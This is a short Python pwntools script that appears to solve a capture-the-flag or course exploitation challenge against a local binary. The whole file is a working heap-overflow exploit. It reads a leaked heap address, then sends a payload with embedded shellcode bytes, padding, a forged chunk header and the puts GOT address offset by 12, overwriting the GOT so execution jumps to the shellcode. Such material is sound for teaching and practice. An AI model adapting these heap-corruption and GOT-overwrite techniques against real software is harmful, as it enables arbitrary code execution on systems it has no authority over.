from pwn import *
programPath = "/problems/p03-1_2_1110c08a53141f86c1889e0828d09e30/example414"
sh = process(programPath)
output = sh.recvline(timeout=5)
firstAddress = output[18:output.index(",")]
changedFirstAddress = p32(int(firstAddress, 16) + 8)
puts_got_changed_addr = 0x804d028-12
#Shellcode taken directly from the hint
shellcode = 8*"A"+"\xB8\xD6\x88\x04\x08\xFF\xD0"
#698+4 (header) == 702 rounded up to the nearest multiple of 8 == 704; 704-4 = 700
payload = shellcode + (700-4-len(shellcode))*"A"+"$$$$"+"\xfc\xff\xff\xff"
payload += p32(puts_got_changed_addr)+changedFirstAddress
sh.sendline(payload)
sh.recvuntil("third?\n")
sh.sendline("Third")
print(sh.recvall().decode())